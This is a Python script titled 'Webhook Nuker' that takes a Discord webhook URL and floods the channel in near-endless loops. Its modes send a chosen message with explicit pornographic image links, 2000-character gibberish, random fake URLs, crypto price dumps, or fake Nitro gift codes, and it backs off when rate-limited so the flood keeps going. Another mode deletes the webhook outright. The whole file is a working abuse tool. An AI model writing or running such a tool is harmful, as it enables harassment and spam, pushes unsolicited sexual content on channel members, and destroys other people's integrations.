import requests
import time
import random

print('''

Webhook Nuker
v1.3.2 FMH

1 = hentai hook (and normal) 
2 = jibberish spam
5 = http url spam (funny)
6 = webhook deleter 
7 = crypto spammer 
8 = nitro code spammer

''')
maaain = input("Enter Number : ")
if maaain =="1":
  webhook = input("Enter The Entire Discord Webhook : ")
  time.sleep(.5)
  message = input("Message To Send : ")
  time.sleep(.5)
  quest1 = input("Add Hentai? y/n : ")
  if quest1 =="y":
   name2 = input("Hooks Username : ")
   hh = int(999999999999)
   for i in range(hh):  
     ballsxdxxd3 = random.choice(['https://nekos.life/api/v2/img/boobs','https://nekos.life/api/v2/img/pussy'])
     res = requests.get(f"{ballsxdxxd3}")
     boobs = curl = res.json()["url"]   
     main = f"{message} -- {boobs}"
     h = requests.post(webhook, json={"content": str(main), "name": str(name2), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
     print(f"Message Sent - {h}")
     time.sleep(.5)
     if h.status_code == 429:    
        print(f"Rate Limited {h}")
        time.sleep(3)
  elif quest1 =="n":
    name3 = input("Hooks Username : ")
    he = int(999999999999)
    for i in range(he):
      h = requests.post(webhook, json={"content": str(message), "name": str(name3), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
      time.sleep(.5)
      print(f"Message Sent - {h}")
      if h.status_code == 429:    
        print(f"Rate Limited {h}")
        time.sleep(3)
elif maaain =="2":
  webhook = input("Enter The Entire Discord Webhook : ")
  name2 = input("Name Of Webhook : ")
  time.sleep(.5)
  e = int(999999999) 
  for i in range(e):
    cood43 = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890?![:#_]") for _ in range(2000))    
    h = requests.post(webhook, json={"content": str(cood43), "name": str(name2), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
    time.sleep(.5)
    print(f"Message Sent - {h}")
    if h.status_code == 429:    
       print(f"Rate Limited {h}")
elif maaain =="5":
  webhook = input("Enter The Full Webhook Url : ")
  mess = input("Enter The Message : ")
  numm = int(9999999999)
  for i in range(numm):
    domain = random.choice(['.net','.com'])
    urlz = random.choice(['people','family','apple','cart','shoe','pro','sports','home','smile','read','hat','boat','dot','data','font'])
    hb = "".join(random.choice("abcdefghijklmnopqrstuvwxyz")for _ in range(1))
    domain2 = random.choice(['.net','.com'])
    urlz2 = random.choice(['dog','cat','sex','file','text','map','tub','fly','mob','got','weed','space','lo','call','and','wood'])
    hb2 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz")for _ in range(1))       
    domain3 = random.choice(['.net','.com'])    
    hb3 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz")for _ in range(1))
    urlz3 = random.choice(['pop','job','bus','rod','new','music','mad','disk','ok','chat','bomb','pa','star','web','toy','fun'])
    name7 = "h"
    stat1 = (f"https://{urlz}{hb}{domain}")
    stat2 = (f"https://{urlz2}{hb2}{domain2}")
    stat3 = (f"https://{urlz3}{hb3}{domain3}")
    message = f" {mess} : {stat1} - {stat2} - {stat3} " 
  
    h = requests.post(webhook, json={"content": str(message), "name": str(name7), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
    time.sleep(.5)
    print(f"Message Sent - {h}")
    if h.status_code == 429:    
       print(f"Rate Limited {h}")
    
elif maaain =="6":
  webhook = input("Enter The Full Webhook Url : ")
  requests.delete(webhook)
  print("Webhook Deleted, Checking To Make Sure Now")
  b = requests.get(webhook)
  print(f"{b.text}")
  
elif maaain =="7":
  webhook = input("Enter The Full Webhook Url : ")
  numm = int(9999999999)
  for i in range(numm):    
    randy = random.randint(1, 2000)
    list = (['https://api.coindesk.com/v1/bpi/currentprice.json','https://open.er-api.com/v6/latest/USD','https://api.coingecko.com/api/v3/exchanges?per_page=1&page=250','https://api.coinpaprika.com/v1/global','https://api.coinlore.net/api/global/',f'https://api.coinlore.net/api/tickers/?start={randy}&limit=1'])
    ok = random.choice(list)
    message = requests.get(ok)
    h = requests.post(webhook, json={"content": str(message.text), "name": "Coin Bot", "avatar_url": "https://media.discordapp.net/attachments/959155376970924042/959157347375284224/716DBFF-DCBE-46E2-90B2-1A34FECFBC13.jpg"})
    time.sleep(.5)
    print(f"Message Sent - {h}")
    if h.status_code == 429:    
       print(f"Rate Limited {h}")
    if h.status_code == 400:
      print("More Then 2000 Caracters Dectected!")
elif maaain =="8":
 webhook = input("Enter The Full Webhook Url : ")
 mess = input("Enter Message To Send : ")
 numm = int(9999999999)
 for i in range(numm):
   cood43 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(16))  
   cood44 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(16)) 
   cood45 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(16))    
   message = f" {mess} : discord.gift/{cood43} - discord.gift/{cood44} -  discord.gift/{cood45}"
   h = requests.post(webhook, json={"content": str(message), "name": "Nitro", "avatar_url": "https://media.discordapp.net/attachments/961457988441374810/961617389294846002/IMG_0199.jpg"})
   time.sleep(.5)
   print(f"Message Sent - {h}")
   if h.status_code == 429:    
      print(f"Rate Limited (Ratetio){h}")
   if h.status_code == 400:
     print("More Then 2000 Characters Dectected!")
    
 
  
  
  
else:
  print("Invalid Responce")

